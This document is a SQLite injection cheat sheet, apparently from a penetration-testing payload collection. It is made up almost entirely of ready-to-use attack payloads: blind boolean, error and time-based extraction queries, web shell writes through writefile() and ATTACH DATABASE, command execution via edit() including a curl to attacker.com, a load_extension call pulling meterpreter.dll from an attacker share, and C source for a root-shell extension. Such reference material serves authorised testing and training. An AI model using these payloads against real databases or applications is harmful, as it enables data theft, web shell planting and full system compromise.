# SQLite Injection

## Summary

- [SQLite Injection](#sqlite-injection)
  - [Summary](#summary)
  - [Basics](#basics)
  - [Built-in scalar functions](#built-in-scalar-functions)
  - [SQLite version](#sqlite-version)
  - [String based - Extract database structure](#string-based---extract-database-structure)
  - [Integer/String based - Extract table name](#integerstring-based---extract-table-name)
  - [Integer/String based - Extract column name](#integerstring-based---extract-column-name)
  - [Boolean - Count number of tables](#boolean---count-number-of-tables)
  - [Boolean - Enumerating table name](#boolean---enumerating-table-name)
  - [Boolean - Extract info](#boolean---extract-info)
  - [Boolean - Extract info (order by)](#boolean---extract-info-order-by)
  - [Boolean - Error based](#boolean---error-based)
  - [Time based](#time-based)
  - [Arbitrary File Read and Write](#arbitrary-file-read-and-write)
    - [`readfile()/writefile()`](#readfilewritefile)
    - [`ATTACH DATABASE`](#attach-database)
  - [Remote Command Execution](#remote-command-execution)
    - [`edit()`](#edit)
    - [`load_extension()`](#load_extension)
  - [List all available functions](#list-all-available-functions)
  - [References](#references)
## Basics
```sql
-- Single line comment
/* Multiline
   comment */

-- Concatenation operator
"abc" || "def"              -- "abcdef"

-- BLOB literals
X'2f6574632f706173737764'   -- /etc/passwd

-- Escaping quotes
'5 O''clock'                -- 5 O'clock
"""quote"""                 -- "quote"
```

## [Built-in scalar functions](https://www.sqlite.org/lang_corefunc.html)
```sql
char(112,97,115,115,119,100)      -- passwd
hex('/etc/passwd')                -- 2f6574632f706173737764
unhex('2f6574632f706173737764')   -- /etc/passwd    (only since 3.41.0)

length("abcdef")                  -- 6
substr("abcdef", 4, 3)            -- def
```

## SQLite version

```sql
select sqlite_version();
```

## String based - Extract database structure

```sql
SELECT sql FROM sqlite_schema
```

## Integer/String based - Extract table name

```sql
SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
```

## Integer/String based - Extract column name

```sql
SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'
```

For a clean output

```sql
SELECT replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARY KEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOT NULL",''),",",'~~') FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name'
```

Cleaner output

```sql
SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('table_name');
```

## Boolean - Count number of tables

```sql
and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) < number_of_table
```

## Boolean - Enumerating table name

```sql
and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=table_name_length_number
```

## Boolean - Extract info

```sql
and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) > hex('some_char')
```

## Boolean - Extract info (order by)

```sql
CASE WHEN (SELECT hex(substr(sql,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) = hex('some_char') THEN <order_element_1> ELSE <order_element_2> END
```

## Boolean - Error based

```sql
AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END
```

## Time based

```sql
AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
```

## Arbitrary File Read and Write
### [`readfile()/writefile()`](https://www.sqlite.org/cli.html#file_i_o_functions)
These two functions are **not available** unless extension is loaded or option has been selected when compiling SQLite.

These functions are disabled in `--safe` mode.
```sql
SELECT readfile('/etc/passwd');
SELECT writefile('lol.php',"<?php system($_GET['cmd']); ?>");
```

### [`ATTACH DATABASE`](https://www.sqlite.org/lang_attach.html)
This keyword is disabled in `--safe` mode.
```sql
ATTACH DATABASE '/var/www/lol.php' AS lol;
CREATE TABLE lol.pwn (dataz text);
INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
```

## Remote Command Execution
### [`edit()`](https://www.sqlite.org/cli.html#editfunc)
Since version **3.22.0** (2018), if you have a TTY/PTY you can use [`edit()` function](https://www.sqlite.org/cli.html#editfunc).

This function is disabled in `--safe` mode.
```sql
SELECT 1 FROM t WHERE edit('','sh -c id');
SELECT 1 FROM t WHERE edit('','sh -c "ls -alh"');
SELECT 1 FROM t WHERE edit('','vim -c":!curl http://attacker.com" -c:q!');
SELECT 1 FROM t WHERE edit('','vim');               -- would require a TTY/PTY
SELECT 1 FROM t WHERE edit('','/usr/bin/vim');      -- would require a TTY/PTY
```

### [`load_extension()`](https://www.sqlite.org/loadext.html)

This function is **disabled by default.**

The second argument determines what function to call from the lib. When the second argument is not specified the `sqlite3_extension_init()` function gets called instead.
```sql
SELECT 1 FROM t WHERE load_extension('./evil');
UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
```

```c
// Sample SQLite extension with setuid and shell
//
//  *nix: gcc -g -fPIC -shared lib.c -o lib.so
// MacOS: gcc -g -fPIC -dynamiclib lib.c -o lib.dylib
// MinGW: gcc -g -fPIC -shared lib.c -o lib.dll
//  MSVC: cl lib.c -link -dll -out:lib.dll

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <sqlite3ext.h>
SQLITE_EXTENSION_INIT1

#ifdef _WIN32
__declspec(dllexport)
#endif
int sqlite3_extension_init(
  sqlite3 *db, 
  char **pzErrMsg, 
  const sqlite3_api_routines *pApi
){
  int rc = SQLITE_OK;
  SQLITE_EXTENSION_INIT2(pApi);
  setuid (0);
  setgid (0);
  execve ("/bin/sh", 0,0);
  return rc;
}
```

## List all available functions
```sql
SELECT name FROM pragma_function_list;
```

## References
- [Injecting SQLite database based application - Manish Kishan Tanwar](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf)
- [SQLite Error Based Injection for Enumeration](https://rioasmara.com/2021/02/06/sqlite-error-based-injection-for-enumeration/)
